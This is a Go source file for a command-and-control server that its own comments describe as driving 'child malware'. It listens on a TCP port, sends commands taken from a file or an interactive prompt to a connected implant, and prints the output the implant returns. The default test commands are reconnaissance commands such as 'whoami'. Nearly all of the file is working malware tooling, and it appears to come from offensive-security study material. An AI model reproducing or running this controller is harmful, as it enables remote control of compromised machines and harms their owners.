package main

import (
	"bufio"
	"encoding/json"
	"flag"
	"fmt"
	"net"
	"os"
	"reflect"
	"strings"
)

type Results struct {
	CommandsList []string
	ID           int
	//Command string
	Output string
	Time   string
}

var (
	testArray = []string{"whoami", "hostname"}
	connect   = flag.String("connect", "", "connection must be in form <ip>:<Port> eg: 127.0.0.1:9999")
	commands  = flag.String("commands", "", "Execute a list of commands from a file. Include file name eg: commands commands.txt")
)

func listMode(fileToRead string) {
	/* Takes a list of commands from a file, reads it in line by line
	and executes the commands on the child malware.
	*/
	fmt.Println("Running in Command List Mode")

	//read in files
	fmt.Println("Reading commands from: ", fileToRead)
	file, err := os.Open(fileToRead)
	if err != nil {
		fmt.Println("opening file error", err)
	}

	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	var txtlines []string

	for scanner.Scan() {
		txtlines = append(txtlines, scanner.Text())
	}

	fmt.Println("COMMANDS to be run")
	for _, value := range txtlines {
		fmt.Println(value)
	}

	fmt.Println("WAITING ON CONNECTION")
	fmt.Println("Connect the Child Malware to: ", *connect)

	l, err := net.Listen("tcp", *connect)
	if err != nil {
		fmt.Println(err)
		return
	}
	c, err := l.Accept()
	if err != nil {
		fmt.Println(err)
		return
	}

	inputTest := &Results{
		ID: 1,
		// Commands:     true,
		CommandsList: txtlines,
	}

	encoder := json.NewEncoder(c)
	encoder.Encode(inputTest)

	var outputTest Results

	for x := 0; x < len(inputTest.CommandsList); x++ {
		decoder := json.NewDecoder(c)

		decoder.Decode(&outputTest)

		fmt.Println("===Results===")
		// currentTime := time.Now()

		// fmt.Printf("current time is :%s", currentTime.Format("2006-01-02 15:04:05")) // time for logging
		// fmt.Println("\ntype is ", reflect.TypeOf(now))
		fmt.Println("Time of command execution: ", outputTest.Time)
		fmt.Println(outputTest.ID, outputTest.Output)
	}
}
func checkError(err error) {
	if err != nil {
		fmt.Println("Fatal error ", err.Error())
		os.Exit(1)
	}
}

func main() {

	//parsing flags
	flag.Parse()

	// cert, err := tls.LoadX509KeyPair("C:\\Users\\haydn\\Desktop\\hackers\\blackhatgo\\src\\RTV\\openssl\\ca.pem", "C:\\Users\\haydn\\Desktop\\hackers\\blackhatgo\\src\\RTV\\openssl\\ca.key")
	// checkError(err)

	// config := tls.Config{Certificates: []tls.Certificate{cert}}

	if *connect == "" {
		fmt.Println("empty connection")
		flag.PrintDefaults()
		os.Exit(1)
	}

	if *commands == "" {
		fmt.Println("no file name included")
		flag.PrintDefaults()
		os.Exit(1)
	} else if *commands != "" {
		listMode(*commands)

	} else {

		// l, err := tls.Listen("tcp", *connect, &config)
		l, err := net.Listen("tcp", *connect)
		if err != nil {
			fmt.Println(err)
			return
		}

		fmt.Println("===ADMIN SERVER LISTENING ===")
		defer l.Close()

		c, err := l.Accept()
		if err != nil {
			fmt.Println(err)
			return
		}
		fmt.Println(reflect.TypeOf(c))

		fmt.Println("PARENT CONNECTED")

		for {
			// PORT := ":" + arguments[1]

			reader := bufio.NewReader(os.Stdin)
			fmt.Print(">> ")
			text, _ := reader.ReadString('\n')
			fmt.Fprintf(c, text+"\n")

			// if STOp is typed
			if strings.TrimSpace(string(text)) == "STOP" {
				fmt.Fprintf(c, text+"\n")
				fmt.Println("Closing TCP server!")

				return
			}

			var outputTest Results
			decoder := json.NewDecoder(c)
			decoder.Decode(&outputTest)
			fmt.Println("===Results===")

			fmt.Printf("Time of command execution: :%s\n", outputTest.Time)
			fmt.Println(outputTest.Output)
			//outputTest.ID

		}
	}

}
